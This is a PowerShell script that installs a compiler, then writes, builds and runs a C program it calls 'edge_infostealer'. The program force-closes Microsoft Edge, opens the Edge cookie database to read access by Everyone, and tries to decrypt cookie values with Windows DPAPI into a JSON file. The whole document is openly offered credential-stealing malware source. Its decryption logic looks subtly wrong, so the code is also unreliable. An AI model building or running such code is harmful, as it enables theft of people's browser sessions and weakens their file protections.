# Define the URL for w64devkit
$w64devkitUrl = "https://github.com/skeeto/w64devkit/releases/download/v2.0.0/w64devkit-x86-2.0.0.exe"
$w64devkitExe = "w64devkit-x86-2.0.0.exe"
$w64devkitDir = "w64devkit"

# Download w64devkit
Invoke-WebRequest -Uri $w64devkitUrl -OutFile $w64devkitExe

# Run the w64devkit installer
Start-Process -FilePath $w64devkitExe -ArgumentList "/SILENT" -Wait

# Define the C program
$cProgram = @"
#include <windows.h>
#include <wincrypt.h>
#include <aclapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Function to print data in hex format for debugging
void print_hex(const BYTE *data, DWORD data_len) {
    for (DWORD i = 0; i < data_len; i++) {
        printf("%02x ", data[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }
    printf("\n");
}

// Function to convert hex string to binary data
void hex_to_bin(const char *hex_str, BYTE **bin_data, DWORD *bin_len) {
    size_t hex_len = strlen(hex_str);
    *bin_len = hex_len / 2;
    *bin_data = (BYTE *)malloc(*bin_len);

    for (size_t i = 0; i < *bin_len; i++) {
        sscanf(hex_str + 2 * i, "%2hhx", &(*bin_data)[i]);
    }
}

// Function to decrypt data using Windows DPAPI
void decrypt_data(const BYTE *data, DWORD data_len, BYTE **decrypted_data, DWORD *decrypted_data_len) {
    DATA_BLOB encrypted_blob;
    DATA_BLOB decrypted_blob;

    encrypted_blob.pbData = (BYTE *)data;
    encrypted_blob.cbData = data_len;

    if (CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob)) {
        *decrypted_data = (BYTE *)malloc(decrypted_blob.cbData);
        memcpy(*decrypted_data, decrypted_blob.pbData, decrypted_blob.cbData);
        *decrypted_data_len = decrypted_blob.cbData;
        LocalFree(decrypted_blob.pbData);
        printf("Decryption successful\n");
    } else {
        printf("Decryption failed: %d\n", GetLastError());
    }
}

// Function to read the cookies file and extract encrypted data
void read_cookies_file(const char *path) {
    FILE *file = fopen(path, "rb");
    if (!file) {
        perror("Failed to open file");
        return;
    }

    // Determine the file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate buffer to hold the entire file content
    BYTE *file_data = (BYTE *)malloc(file_size);
    if (!file_data) {
        perror("Failed to allocate memory");
        fclose(file);
        return;
    }

    // Read the entire file content
    fread(file_data, 1, file_size, file);
    fclose(file);

    printf("Read %ld bytes from file\n", file_size);
    print_hex(file_data, file_size);

    // Example: Extracting encrypted values from the binary data
    // This is a simplified example and may need adjustments based on the actual file structure
    for (long i = 0; i < file_size - 16; i++) {
        if (file_data[i] == 0x76 && file_data[i + 1] == 0x31) { // Example pattern to identify encrypted data
            BYTE *encrypted_value = &file_data[i];
            DWORD encrypted_value_len = 16; // Example length of encrypted data

            printf("Encrypted value (hex):\n");
            print_hex(encrypted_value, encrypted_value_len);

            BYTE *decrypted_data = NULL;
            DWORD decrypted_data_len = 0;

            decrypt_data(encrypted_value, encrypted_value_len, &decrypted_data, &decrypted_data_len);

            if (decrypted_data) {
                // Write decrypted data to JSON file
                FILE *json_file = fopen("decrypted.json", "a");
                if (json_file) {
                    fprintf(json_file, "{\n\t\"decrypted_data\": \"%.*s\"\n}\n", decrypted_data_len, decrypted_data);
                    fclose(json_file);
                    printf("Decrypted data written to decrypted.json\n");
                } else {
                    perror("Failed to open JSON file");
                }
                free(decrypted_data);
            } else {
                printf("Decryption returned NULL\n");
            }
        }
    }

    free(file_data);
}

// Function to set file permissions to allow read access
void set_file_permissions(const char *path) {
    DWORD result;
    PSID pEveryoneSID = NULL;
    PACL pACL = NULL;
    EXPLICIT_ACCESS ea;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

    // Create a well-known SID for the Everyone group.
    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
                                  0, 0, 0, 0, 0, 0, 0, &pEveryoneSID)) {
        printf("AllocateAndInitializeSid Error %u\n", GetLastError());
        return;
    }

    // Initialize an EXPLICIT_ACCESS structure for an ACE.
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)pEveryoneSID;

    // Create a new ACL that contains the new ACEs.
    result = SetEntriesInAcl(1, &ea, NULL, &pACL);
    if (ERROR_SUCCESS != result) {
        printf("SetEntriesInAcl Error %u\n", GetLastError());
        if (pEveryoneSID) FreeSid(pEveryoneSID);
        return;
    }

    // Apply the new ACL as the object's DACL.
    result = SetNamedSecurityInfo((LPSTR)path, SE_FILE_OBJECT,
                                  DACL_SECURITY_INFORMATION,
                                  NULL, NULL, pACL, NULL);
    if (ERROR_SUCCESS != result) {
        printf("SetNamedSecurityInfo Error %u\n", GetLastError());
    }

    if (pEveryoneSID) FreeSid(pEveryoneSID);
    if (pACL) LocalFree(pACL);
}

// Function to check if Edge is running and terminate it
void ensure_edge_is_closed() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot (of processes) failed.\n");
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        printf("Process32First failed.\n");
        CloseHandle(hProcessSnap);
        return;
    }

    do {
        if (_stricmp(pe32.szExeFile, "msedge.exe") == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
            if (hProcess != NULL) {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                printf("Terminated Edge process (PID: %u)\n", pe32.th32ProcessID);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
}

int main() {
    char cookies_path[MAX_PATH];
    snprintf(cookies_path, sizeof(cookies_path), "%s\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", getenv("LOCALAPPDATA"));

    // Ensure Edge is closed
    ensure_edge_is_closed();

    // Set file permissions to allow read access
    set_file_permissions(cookies_path);

    // Wait for 10 seconds
    Sleep(10000);

    // Now attempt to read the file
    read_cookies_file(cookies_path);
    return 0;
}
"@

# Save the C program to a file
$cProgramPath = "edge_infostealer.c"
Set-Content -Path $cProgramPath -Value $cProgram

# Compile the C program using w64devkit
$w64devkitBin = "C:\w64devkit\bin"
$gccPath = Join-Path -Path $w64devkitBin -ChildPath "gcc.exe"
$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -lcrypt32"
Invoke-Expression $compileCommand

# Run the compiled executable
$exePath = ".\edge_infostealer.exe"
Invoke-Expression $exePath
